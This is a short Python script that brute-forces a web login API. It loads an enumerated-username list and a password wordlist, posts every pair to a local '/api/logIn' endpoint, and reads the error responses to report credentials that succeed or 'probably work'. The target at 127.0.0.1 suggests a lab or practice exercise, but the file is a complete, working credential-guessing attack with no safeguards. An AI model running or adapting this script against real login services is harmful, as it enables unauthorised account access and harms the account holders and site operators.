import requests
import json
import argparse

usernames_file = 'wordlists/enumerated_usernames.txt'
passwords_file = 'wordlists/passwords.txt'
url = 'http://127.0.0.1/api/logIn'
error_message = 'Wrong password'

def attempt_login(username, password, verbose):
    payload = {
        'username': username,
        'password': password
    }

    headers = {
        'Content-Type': 'application/json',
    }

    try:
        response = requests.post(url, json=payload, headers=headers)

        try:
            response_data = response.json()

            # If the error message matches 'Wrong password', print it as a failure
            if 'error' in response_data and response_data['error'] == error_message:
                if verbose:
                    print(f"Wrong password for username '{username}'.")
            
            # If the response doesn't indicate a wrong password error, we assume success
            elif 'error' not in response_data:  # If there's no error field in the response, it might be successful
                print(f"Login attempt for '{username}' is successful.")
            else:
                print(f"Unexpected error for username '{username}': {response_data.get('error', 'Unknown error')}")
        except ValueError:
                print(f"This combination probably works/// username:'{username}'    password: '{password}'.")

    except requests.RequestException as e:
        if verbose:
            print(f"Request failed for username '{username}': {e}")

def main():
    parser = argparse.ArgumentParser(description="Login attempt script.")
    parser.add_argument('-v', '--verbose', action='store_true', help="Enable verbose output.") # VERBOSE MODE
    args = parser.parse_args()

    with open(usernames_file, 'r') as file:
        usernames = file.readlines()
    
    with open(passwords_file, 'r') as file:
        passwords = file.readlines()

    for username in usernames:
        username = username.strip()
        if username:
            for password in passwords:
                password = password.strip()
                if password:
                    attempt_login(username, password, args.verbose)

if __name__ == '__main__':
    main()
